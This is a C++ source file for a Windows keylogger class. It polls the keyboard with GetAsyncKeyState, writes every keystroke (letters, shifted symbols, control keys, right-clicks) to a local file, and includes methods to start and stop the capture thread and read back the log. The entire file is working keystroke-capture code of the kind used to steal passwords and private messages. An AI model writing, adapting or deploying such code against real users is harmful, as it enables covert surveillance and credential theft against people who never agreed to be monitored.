#include "KeyLogger.h"
static fstream LogFile;

KeyLogger::KeyLogger()
{
}

KeyLogger::~KeyLogger()
{
}

void KeyLogger::stopKeyLogger(HANDLE handle)
{
	TerminateThread(handle, 0);
}

string KeyLogger::getKeyLoggerData()
{
	LogFile.open("keyLogger.txt", ios::in);
	std::string line, text;
	while (std::getline(LogFile, line))
	{
		text += line + "\n";
	}
	LogFile.clear();//empty the file
	LogFile.close();
	return text;
}

char KeyLogger::convertKey(int key)
{
	switch (key)
	{
	case 49: return '!';
	case 50: return '@';
	case 51: return '#';
	case 52: return '$';
	case 53: return '%';
	case 54: return '^';
	case 55: return '&';
	case 56: return '*';
	case 57: return '(';
	case 48: return ')';
	case 45: return '_';
	case 61: return '+';
		//case 56: return '*';
	}
	return '\0';
}

void KeyLogger::keyLOG(string input) {
	fstream LogFile;
	LogFile.open("keyLogger.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool KeyLogger::SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_CONTROL:
		keyLOG("#CTRL#");
		return true;
	case VK_TAB:
		keyLOG("\t");
		return true;
	case VK_SPACE:
		keyLOG(" ");
		return true;
	case VK_RETURN:
		keyLOG("\n");
		return true;
	case '¾':
		keyLOG(".");
		return true;
	case VK_BACK:
		keyLOG("\b");
		return true;
	case VK_RBUTTON:
		keyLOG("#R_CLICK#");
		return true;
	case VK_SHIFT:
		keyLOG("");
		return true;
	default:
		return false;
	}
}

DWORD WINAPI KeyLogger::startKeyLogger(LPVOID param)
{
	while (true) {
		std::this_thread::sleep_for(chrono::milliseconds(10));
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					LogFile.open("keyLogger.txt", ios::out|ios::app);
					if (LogFile.is_open()) {
						if (KEY >= 65 && KEY <= 90) // letters
						{
							if ((GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) // capital letters
							{
								LogFile << char(KEY);
							}
							else // lower letters
							{
								LogFile << char(KEY + 32);
							}
						}
						else // not letters
						{
							if (GetKeyState(VK_SHIFT) & 0x8000) // shift is on 
							{
								char newKey = convertKey(KEY);
								if (newKey != '\0')
								{
									LogFile << newKey;
								}
							}
							else // shift is off 
							{
								LogFile << char(KEY);
							}
						}
						LogFile.close();
					}
				}
			}
		}
	}
}
